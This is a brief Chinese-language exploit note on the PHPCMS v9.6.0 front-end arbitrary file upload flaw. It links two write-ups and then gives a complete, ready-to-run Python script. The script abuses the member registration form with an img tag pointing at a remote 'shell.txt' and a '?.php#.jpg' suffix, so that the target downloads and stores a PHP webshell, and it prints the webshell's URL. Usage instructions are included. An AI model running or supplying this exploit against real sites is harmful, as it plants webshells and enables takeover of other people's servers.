# 知识点
前台任意文件上传<br />[PHPCMS_V9.6.0任意文件上传漏洞分析 - 腾讯云开发者社区-腾讯云](https://cloud.tencent.com/developer/article/1802267)<br />[PHPCMS_V9.2任意文件上传getshell漏洞分析](https://mp.weixin.qq.com/s?__biz=MzU4NTY4MDEzMw==&mid=2247489053&idx=1&sn=de7468d2e9605a23aab7f21bc1c31ae4&scene=21#wechat_redirect)
# 思路
```php
'''
version: python3
Author: Tao
'''
import requests
import re
import random
import sys

def anyfile_up(surl,url):
    url = "{}/index.php?m=member&c=index&a=register&siteid=1".format(url)
    data = {
        'siteid': '1',
        'modelid': '1',
        'username': 'Tao{}'.format(random.randint(1,9999)),
        'password': '123456',
        'email': 'Tao{}@xxx.com'.format(random.randint(1,9999)),
        'info[content]': '<img src={}?.php#.jpg>'.format(surl),
        'dosubmit': '1',
        'protocol': ''
    }
    r = requests.post(url, data=data)
    return_url = re.findall(r'img src=(.*)&gt',r.text)
    if len(return_url):
        return return_url[0]
if __name__ == '__main__':
    if len(sys.argv) == 3:
        return_url = anyfile_up(sys.argv[1],sys.argv[2])
        print('seccess! upload file url: ', return_url)
    else:
        message = \
        """
        python3 anyfile_up.py [上传内容URL地址] [目标URL]
        example: python3 anyfile_up.py http://www.tao.com/shell.txt http://www.phpcms96.com
        """
        print(message)
```
